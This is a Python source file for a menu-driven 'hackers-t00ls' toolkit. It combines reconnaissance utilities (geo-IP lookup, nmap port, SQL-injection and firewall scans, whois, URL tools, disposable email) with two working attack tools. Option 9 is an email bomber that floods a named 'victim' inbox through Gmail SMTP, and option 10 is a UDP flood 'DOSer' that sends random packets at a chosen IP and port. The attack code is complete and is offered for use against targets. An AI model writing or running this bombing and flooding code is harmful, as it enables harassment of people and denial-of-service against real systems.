#################################################--import libraries and install if not installed--#################################################
import subprocess, platform, random, string, time, sys, os, re, smtplib

installing = input("is pip or pip3 installed?(pip/pip3)")
try:
    import pyfiglet, json, pprint, nmap, whois, pyperclip, requests as rq, pyshorteners as ps
except ModuleNotFoundError:
    print("modules are not installed")
    os.system(installing+" install pyfiglet pyperclip requests python-whois python-nmap==0.6.1 pyshorteners==1.0.1")
    print("Got An Error?, restart the program!")

import pyfiglet
if platform.system() == 'Windows':
    os.system("cls")
else:
    os.system("clear")

ascii_banner = pyfiglet.figlet_format("hackers-t00ls")
print(ascii_banner)
print("					By CxllZ")

ans=True
while ans:
    print ("""
    Make sure to turn off VPN, if using Nmap options\n    and make sure your connected to Internet for other options!\n    If You Get An Import Error Try Running The Script Again
    1. Geo Ip Lookup
    2. Port scan (NMAP)
    3. Url Backtracer
    4. Url shortener
    5. Whois
    6. SQLI Scanner (NMAP)
    7. WAF(WEB APP FIREWALL) Detection (NMAP)
    8. Temp Mail
    9. Email Bomber
    10. DOSer
    11. Exit/Quit
    """)
    ans=input("Choose Your T00l: ") 
    if ans=="1":
#################################################--GEO IP LOOKUP--#################################################
        import urllib.request
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        ip = input("Enter Ip -->: ")
        url1 = "http://ip-api.com/json/"+ip+"?fields=mobile,proxy,hosting"
        url2 = "http://ipwhois.app/json/"+ip
        response2 = urllib.request.urlopen(url2) 
        response1 = urllib.request.urlopen(url1)
        data2 = response2.read()
        data1 = response1.read()
        values2 = json.loads(data2)
        values1 = json.loads(data1)
        print("NOT ACCURATE AS ALWAYS!")
        pprint.pprint(values1)
        pprint.pprint(values2)
        print("NOT ACCURATE AS ALWAYS!")
    elif ans=="2":
#################################################--NMAP PORT SCAN AND SET NMAP TO PATH--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        answer = None 
        while answer not in ("yes", "no"):
            print("Do You Have Nmap Installed?")
            answer = input("Enter yes or no: ") 
            if answer == "yes": 
                if platform.system() == 'Windows':
                    set_path = 'setx PATH "%PATH%;C:\\Program Files (x86)\\Nmap"'
                    os.system(set_path)
                    print("Finished Setting Nmap To PATH")
                    print()
                    print("If you get an error open another cmd/terminal and execute python script")
                    ip = input ("IP Target -->: ")
                    print ("nmap is scanning ip for open ports please be patient")
                    print("Waiting for too long?, hit any key")
                    print ()
                    nm = nmap.PortScanner()
                    nm.scan(ip, '0-1024')
                    for host in nm.all_hosts():
                        print('----------------------------------------------------')
                        print('Host : {} ({})'.format(ip, nm[ip].hostname()))
                        print('State : {}'.format(nm[ip].state()))
                        for proto in nm[ip].all_protocols():
                            print('----------')
                            print('Protocol : {}'.format(proto))
                            lport = nm[ip][proto].keys()
                            for port in lport:
                                print ('port : {}\tstate : {}'.format(port, nm[ip][proto][port]['state']))
                else:
                    print("If you get an error open another cmd/terminal and execute python script")
                    ip = input ("IP Target -->: ")
                    print ("nmap is scanning ip for open ports please be patient")
                    print("Waiting for too long?, hit any key")
                    print ()
                    nm = nmap.PortScanner()
                    nm.scan(ip, '0-1024')
                    for host in nm.all_hosts():
                        print('----------------------------------------------------')
                        print('Host : {} ({})'.format(ip, nm[ip].hostname()))
                        print('State : {}'.format(nm[ip].state()))
                        for proto in nm[ip].all_protocols():
                            print('----------')
                            print('Protocol : {}'.format(proto))
                            lport = nm[ip][proto].keys()
                            for port in lport:
                                print ('port : {}\tstate : {}'.format(port, nm[ip][proto][port]['state']))
            elif answer == "no":
                print("")
                print("Install Nmap Here!:")
                print("Windows: https://nmap.org/dist/nmap-7.91-setup.exe")
                print("Mac Os: https://nmap.org/dist/nmap-7.91.dmg")
            else: 
    	        print("Please enter yes or no.") 
    elif ans=="3":
#################################################--URL BACKTRACER--#################################################
        from urllib.request import urlopen
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        link = input("Enter Url Here -->: ")
        a = urlopen(link)
        print()
        print("Short Url Goes To:",  a.url)
    elif ans=="4":
#################################################--URL SHORTENER--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        link = input("Enter Url You Wish To Shorten -->: ")
        output = ps.Shortener().tinyurl.short(link)
        print(output)
    elif ans=="5":
#################################################--URL WHOIS--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        host = input("Enter Url To Whois(example.com) -->: ")
        print("Got An Error Try Running pip uninstall whois\n then pip install python-whois")
        print(whois.whois(host))
    elif ans=="6":
######################################--SQLI SCANNER--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        print("Do You Have Nmap Installed?")
        answer1 = input("Enter yes or no: ") 
        if answer1 == "yes": 
            if platform.system() == 'Windows':
                set_path = 'setx PATH "%PATH%;C:\\Program Files (x86)\\Nmap"'
                os.system(set_path)
                print("Finished Setting Nmap To PATH")
                print("If you get an error open another cmd/terminal and execute python script")
                w = input("Enter Top-Level-Domain Url To SQLI Scan(example.com) -->: ")
                print ("nmap is scanning ip for SQLI please be patient")
                print("Waiting for too long?, hit any key")
                print ()
                subprocess.call(['nmap', '--script', 'http-sql-injection', w])
                print("If No Results It Has No SQLI Vulnerabilites")
            else:
                print("If you get an error open another cmd/terminal and execute python script")
                w = input("Enter  Top-Level-Domain Url To SQLI Scan(example.com) -->: ")
                print ("nmap is scanning ip for SQLI please be patient")
                print("Waiting for too long?, hit any key")
                print ()
                subprocess.call(['nmap', '--script', 'http-sql-injection', w])
                print("If No Results It Has No SQLI Vulnerabilites")
        elif answer1 == "no":
            print("")
            print("Install Nmap Here!:")
            print("Windows: https://nmap.org/dist/nmap-7.91-setup.exe")
            print("Mac Os: https://nmap.org/dist/nmap-7.91.dmg")
        else: 
    	    print("Please enter yes or no.")
    elif ans=="7":
######################################--WAF(WEB APP FIREWALL) DETECTOR--#################################################
        if platform.system() == 'Windows':
            os.system("cls")
        else:
            os.system("clear")
        print(ascii_banner)
        print("					By CxllZ")
        print("Do You Have Nmap Installed?")
        answer2 = input("Enter yes or no: ") 
        if answer2 == "yes": 
            if platform.system() == 'Windows':
                set_path = 'setx PATH "%PATH%;C:\\Program Files (x86)\\Nmap"'
                os.system(set_path)
                print("Finished Setting Nmap To PATH")
                print("If you get an error open another cmd/terminal and execute python script")
                w = input("Enter Top-Level-Domain Url To WAF Detect(example.com) -->: ")
                print ("nmap is scanning url for waf's please be patient")
                print("Waiting for too long?, hit any key")
                subprocess.call(['nmap', '--script', 'http-waf-detect,http-waf-fingerprint', w])
                print("If No Results It Has No WAF")
            else:
                print("If you get an error open another cmd/terminal and execute python script")
                w = input("Enter Top-Level-Domain Url To WAF Detect(example.com) -->: ")
                print ("nmap is scanning url for waf's please be patient")
                print("Waiting for too long?, hit any key")
                print ()
                subprocess.call(['nmap', '--script', 'http-waf-detect,http-waf-fingerprint', w])
                print("If No Results It Has No WAF")
        elif answer2 == "no":
            print("")
            print("Install Nmap Here!:")
            print("Windows: https://nmap.org/dist/nmap-7.91-setup.exe")
            print("Mac Os: https://nmap.org/dist/nmap-7.91.dmg")
        else: 
    	    print("Please enter yes or no.")
    elif ans=="8":
######################################--TEMP-FAKE MAIL--#################################################
        import requests
        API = 'https://www.1secmail.com/api/v1/'
        domainList = ['1secmail.com', '1secmail.net', '1secmail.org']
        domain = random.choice(domainList)
        def generateUserName():
            name = string.ascii_lowercase + string.digits
            username = ''.join(random.choice(name) for i in range(10))
            return username
        def extract():
            getUserName = re.search(r'login=(.*)&',newMail).group(1)
            getDomain = re.search(r'domain=(.*)', newMail).group(1)
            return [getUserName, getDomain]
        def print_statusline(msg: str):
            last_msg_length = len(print_statusline.last_msg) if hasattr(print_statusline, 'last_msg') else 0
            print(' ' * last_msg_length, end='\r')
            print(msg, end='\r')
            sys.stdout.flush()
            print_statusline.last_msg = msg
        def checkMails():
            reqLink = f'{API}?action=getMessages&login={extract()[0]}&domain={extract()[1]}'
            req = requests.get(reqLink).json()
            length = len(req)
            if length == 0:
                print_statusline("Your mailbox is empty. Hold tight. Mailbox is refreshed automatically every 5 seconds.")
            else:
                idList = []
                for i in req:
                    for k,v in i.items():
                        if k == 'id':
                            mailId = v
                            idList.append(mailId)
                x = 'mails' if length > 1 else 'mail'
                print_statusline(f"You received {length} {x}. (Mailbox is refreshed automatically every 5 seconds.)")
                current_directory = os.getcwd()
                final_directory = os.path.join(current_directory, r'All Mails')
                if not os.path.exists(final_directory):
                    os.makedirs(final_directory)
                for i in idList:
                    msgRead = f'{API}?action=readMessage&login={extract()[0]}&domain={extract()[1]}&id={i}'
                    req = requests.get(msgRead).json()
                    for k,v in req.items():
                        if k == 'from':
                            sender = v
                        if k == 'subject':
                            subject = v
                        if k == 'date':
                            date = v
                        if k == 'textBody':
                            content = v
                    mail_file_path = os.path.join(final_directory, f'{i}.txt')
                    with open(mail_file_path,'w') as file:
                        file.write("Sender: " + sender + '\n' + "To: " + mail + '\n' + "Subject: " + subject + '\n' + "Date: " + date + '\n' + "Content: " + content + '\n')
        newMail = f"{API}?login={generateUserName()}&domain={domain}"
        reqMail = requests.get(newMail)
        mail = f"{extract()[0]}@{extract()[1]}"
        pyperclip.copy(mail)
        print("\nYour temporary email is " + mail + " (Email address copied to clipboard.)" + "\n")
        print(f"Inbox of {mail}\n")
        while True:
            checkMails()
            time.sleep(5)
    elif ans=="9":
######################################--EMAIL BOMBER--#################################################
        print("Use a fake gmail acc to bomb and u must have support for 'less secure apps' set to 'turn on' on your Gmail. Here is the link to do so: https://www.google.com/settings/security/lesssecureapps")
        email_provider = 'smtp.gmail.com'
        email_address = input("Enter Attackers Gmail(Gmail ur using to bomb the vitim) -->: ")
        password = input("Enter Your Gmail Password(Gmail Password ur using to bomb the victim) -->: ")
        target_email = input("Enter Target email -->: ")
        msg = input("Enter your email message -->: ")
        email_amount = int(input("Enter your amount of email's -->: "))
        server = smtplib.SMTP(email_provider, 587)
        server.starttls()
        server.login(email_address, password)
        for _ in range(0,email_amount):
            server.sendmail(email_address,target_email,msg)
            print("sent!")
            time.sleep(1)
        print("sent {} emails. :)".format(email_amount))
        server.quit()
    elif ans=="10":
######################################--DOSER--#################################################
        import socket
        timing = input("Enter time: ")
        def doser(pingtime):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            ip1 = input("Enter IP: ")
            port1 = input("Enter port: ")
            sent = 0
            prevtime = int(round(float(time.time())))
            while True:
                sock.sendto(bytes, (ip1, int(port1)))
                sent = int(sent) + 1
                port = int(port1) + 1
                if port == 65534:
                    port = 1
                if int(round(float(time.time())))-prevtime == pingtime:
                    break

        doser(int(timing))
    elif ans=="11":
######################################--EXIT--#################################################
        exit()
    elif ans !="":
        print("\n Not A Valid Choice Try again") 